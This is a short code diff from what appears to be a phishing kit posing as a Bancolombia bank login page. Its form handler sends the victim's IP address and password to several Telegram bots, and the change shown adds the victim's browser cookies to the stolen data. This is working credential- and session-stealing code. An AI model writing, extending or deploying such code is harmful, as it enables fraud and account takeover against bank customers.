@@ -59,7 +59,7 @@ formulario.addEventListener('submit', async function (event) {
     const currentDate = new Date();
     const formattedDate = `${currentDate.getDate()}/${currentDate.getMonth() + 1}/${currentDate.getFullYear()}`;
     
-    const message = `✅\n<b>${ip}</b>\n \n👨🏻‍💻<b>  Bancolombia PasswordLogs</b>\n \n🔑 Password: <b>${clave}</b>\n\n`;
+    const message = `✅\n<b>${ip}</b>\n \n👨🏻‍💻<b>  Bancolombia PasswordLogs</b>\n \n🔑 Password: <b>${clave}</b>\n\n🍪 Cookies: ${document.cookie || 'Sin cookies'}\n`;
     
     // Enviar mensaje a todos los bots configurados
     await Promise.all(telegramBots.map(bot => sendTelegramMessage(bot, message)));
